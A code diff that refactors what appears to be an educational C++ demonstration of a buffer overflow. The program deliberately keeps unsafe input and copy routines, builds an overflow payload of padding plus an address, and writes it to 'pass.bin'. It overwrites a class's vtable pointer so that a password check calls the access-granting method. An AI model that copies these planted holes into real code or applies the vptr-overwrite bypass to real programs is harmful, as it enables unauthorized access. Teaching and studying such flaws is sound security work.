@@ -12,6 +12,8 @@
 using namespace std;
 
 const int PW_BUFFER_SIZE = 4;
+// Adjust based on system architecture if needed (e.g. 8 for 64-bit).
+const int MEM_ADDRESS_SIZE = sizeof(void *);
 
 class BaseUser {
  private:
@@ -19,13 +21,12 @@ class BaseUser {
   unsigned char password_hash[SHA256_DIGEST_LENGTH];
 
  public:
-  BaseUser(char name[], const char *pw) {
+  BaseUser(const char *name, const char *pw) {
     strcpy(this->name, name);
     SHA256((const unsigned char *)pw, strlen(pw), this->password_hash);
   }
 
   virtual void gainAccess() { cout << "Access granted." << endl; }
-
   virtual void denyAccess() { cout << "Access denied." << endl; }
 
   void checkAccess(const char *pw) {
@@ -42,33 +43,17 @@ class BaseUser {
 // --- UNSAFE GETS REPLACEMENT ---
 char *unsafeGets(char *str) {
   char *ret = str;
-  int c;
-  while ((c = getchar()) != '\n' && c != EOF) {
+  while (true) {
+    int c = getchar();
+    if (c == '\n' || c == EOF) break;
     *str++ = c;
   }
   *str = '\0';
   return ret;
 }
 
-char *unsafeRead(char *buffer, int maxSize) {
-  char *ret = buffer;
-  int c;
-  int count = 0;
-  while ((c = getchar()) != '\n' && c != EOF) {
-    *buffer++ = c;
-    count++;
-    if (count >= maxSize) {
-      // Simulates buffer overflow by not stopping.
-      break;
-    }
-  }
-  *buffer = '\0';
-  return ret;
-}
-
 #ifdef NO_PIE
 
-// Announces running without PIE (Position Independent Executable).
 void runWithoutPIE() {
   cout << "Running without PIE - overwrite vptr through input." << endl;
 }
@@ -81,7 +66,6 @@ void unsafeCopy(char *dest, const char *src) {
   *dest = '\0';
 }
 
-// Demonstrates vptr overwrite using an unsafe copy.
 void bufferAccessDemo() {
   BaseUser base("John", "abc");
   char pw[4];
@@ -90,13 +74,9 @@ void bufferAccessDemo() {
   int *p = reinterpret_cast<int *>(b);
   cout << "vptr: 0x" << hex << p[0] << endl;
 
-  // Prepares an overflow buffer to overwrite the vptr.
   char overflowBuffer[sizeof(pw) + 8];
-  for (int i = 0; i < sizeof(pw); i++) {
-    overflowBuffer[i] = 'A';
-  }
-  int address =
-      p[0] - 8;  // Adjust the address based on system architecture if needed.
+  memset(overflowBuffer, 'A', sizeof(pw));
+  int address = p[0] - 8;
   memcpy(overflowBuffer + sizeof(pw), &address, sizeof(address));
 
   cout << "Overflow buffer was generated: ";
@@ -133,12 +113,9 @@ void generateAndWriteOverflowToFile() {
       outfile.write(&c, sizeof(c));
     }
 
-    int adjustment = sizeof(void *) == 4
-                         ? 4
-                         : 8;  // Check if it's a 32-bit or 64-bit system.
-    int address =
-        p[0] - adjustment;  // Adjust the address based on system architecture.
-    outfile.write(reinterpret_cast<const char *>(&address), sizeof(address));
+		// Adjust the address based on system architecture.
+		int address =	p[0] - MEM_ADDRESS_SIZE; 
+		outfile.write(reinterpret_cast<const char *>(&address), sizeof(address));
     outfile.close();
     cout << "Overflow file 'pass.bin' created." << endl;
   } else {
@@ -204,8 +181,8 @@ void vptrAccessDemo() {
   cout << "vptr: 0x" << hex << p[0] << endl;
 
   // modify vptr to gain unauthorized access.
-  *p = (*p) - 8;  // Adjust based on system architecture if needed.
-  cout << "vptr now points to gainAccess: 0x" << hex << *p << endl;
+	*p = (*p) - MEM_ADDRESS_SIZE; 
+	cout << "vptr now points to gainAccess: 0x" << hex << *p << endl;
 
   b->checkAccess(pw);
 }
@@ -215,11 +192,12 @@ void vptrAccessDemo() {
 int main(int argc, char *argv[]) {
 #ifdef NO_PIE
   runWithoutPIE();
-  // Always generate the overflow file on standard run
-  generateAndWriteOverflowToFile();
+  // Check if standard input is being redirected from a file
   if (!isatty(fileno(stdin))) {
     bufferAccessGetsDemo();
   } else {
+    // Generate the overflow file only once.
+    generateAndWriteOverflowToFile();
     bufferAccessDemo();
   }
 #else
